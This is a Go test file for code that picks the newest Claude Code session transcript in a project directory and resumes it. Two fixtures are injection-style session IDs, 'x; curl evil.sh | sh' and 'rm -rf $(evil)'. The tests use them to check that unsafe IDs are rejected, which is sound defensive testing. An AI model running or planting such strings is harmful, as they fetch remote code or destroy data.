package agentsession

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestProjectSlug(t *testing.T) {
	// Claude Code names a project directory after the cwd with every
	// non-alphanumeric character replaced by a dash.
	assert.Equal(t, "-Users-me-dev-app", ProjectSlug("/Users/me/dev/app"))
	// A worktree path has "/." in it, so the mapping yields two dashes in a row.
	assert.Equal(t, "-Users-me-dev-app--worktrees-feat-x", ProjectSlug("/Users/me/dev/app/.worktrees/feat_x"))
	assert.Equal(t, "", ProjectSlug(""))
}

// writeTranscript drops a transcript file with a fixed modification time.
func writeTranscript(t *testing.T, home, cwd, id string, mod time.Time) string {
	t.Helper()
	dir := filepath.Join(home, "projects", ProjectSlug(cwd))
	require.NoError(t, os.MkdirAll(dir, 0o755))
	p := filepath.Join(dir, id+".jsonl")
	require.NoError(t, os.WriteFile(p, []byte("{}\n"), 0o644))
	require.NoError(t, os.Chtimes(p, mod, mod))
	return p
}

func TestLastClaudeSessionPicksTheNewestInWindow(t *testing.T) {
	home := t.TempDir()
	cwd := "/Users/me/dev/app"
	base := time.Now().Add(-time.Hour)

	writeTranscript(t, home, cwd, "old-session", base)
	writeTranscript(t, home, cwd, "new-session", base.Add(30*time.Minute))

	assert.Equal(t, "new-session", LastClaudeSession(home, cwd, base.Add(-time.Minute)))
}

func TestLastClaudeSessionIgnoresTranscriptsOlderThanSince(t *testing.T) {
	home := t.TempDir()
	cwd := "/Users/me/dev/app"
	base := time.Now().Add(-time.Hour)

	// The agent ran here, but before this terminal was ever opened — that
	// conversation belongs to some other window, not to the tab being restored.
	writeTranscript(t, home, cwd, "stale-session", base)

	assert.Equal(t, "", LastClaudeSession(home, cwd, base.Add(time.Minute)))
}

func TestLastClaudeSessionEmptyWhenAgentNeverRanThere(t *testing.T) {
	home := t.TempDir()
	assert.Equal(t, "", LastClaudeSession(home, "/Users/me/dev/untouched", time.Time{}))
	assert.Equal(t, "", LastClaudeSession("", "/Users/me/dev/app", time.Time{}))
	assert.Equal(t, "", LastClaudeSession(home, "", time.Time{}))
}

func TestLastClaudeSessionSkipsNonTranscripts(t *testing.T) {
	home := t.TempDir()
	cwd := "/Users/me/dev/app"
	base := time.Now().Add(-time.Hour)

	writeTranscript(t, home, cwd, "real-session", base)
	dir := filepath.Join(home, "projects", ProjectSlug(cwd))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "notes.md"), []byte("x"), 0o644))
	require.NoError(t, os.MkdirAll(filepath.Join(dir, "subdir.jsonl"), 0o755))

	assert.Equal(t, "real-session", LastClaudeSession(home, cwd, time.Time{}))
}

func TestHomeHonoursClaudeConfigDir(t *testing.T) {
	t.Setenv("CLAUDE_CONFIG_DIR", "/tmp/custom-claude")
	assert.Equal(t, "/tmp/custom-claude", Home())
}

func TestLastClaudeSessionRejectsUnsafeIDs(t *testing.T) {
	home := t.TempDir()
	cwd := "/Users/me/dev/app"
	base := time.Now().Add(-time.Hour)

	// A transcript named with shell metacharacters must never be handed back,
	// even when it is the newest file in the directory — the id is typed
	// verbatim into a shell as `claude --resume <id>`.
	writeTranscript(t, home, cwd, "x; curl evil.sh | sh", base.Add(time.Hour))

	assert.Equal(t, "", LastClaudeSession(home, cwd, base))
}

func TestLastClaudeSessionAcceptsUUIDStyleIDs(t *testing.T) {
	home := t.TempDir()
	cwd := "/Users/me/dev/app"
	base := time.Now().Add(-time.Hour)

	writeTranscript(t, home, cwd, "3fa6c2b0-7e4c-4c1a-9d0e-2a1b3c4d5e6f", base.Add(time.Hour))

	assert.Equal(t, "3fa6c2b0-7e4c-4c1a-9d0e-2a1b3c4d5e6f", LastClaudeSession(home, cwd, base))
}

func TestLastClaudeSessionSkipsUnsafeNewestAndFallsBackToLegitimateOlder(t *testing.T) {
	home := t.TempDir()
	cwd := "/Users/me/dev/app"
	base := time.Now().Add(-time.Hour)

	writeTranscript(t, home, cwd, "legit-session", base.Add(10*time.Minute))
	// Newest by mtime, but unsafe — must be skipped in favour of the legitimate,
	// older transcript rather than returning nothing at all.
	writeTranscript(t, home, cwd, "rm -rf $(evil)", base.Add(30*time.Minute))

	assert.Equal(t, "legit-session", LastClaudeSession(home, cwd, base))
}
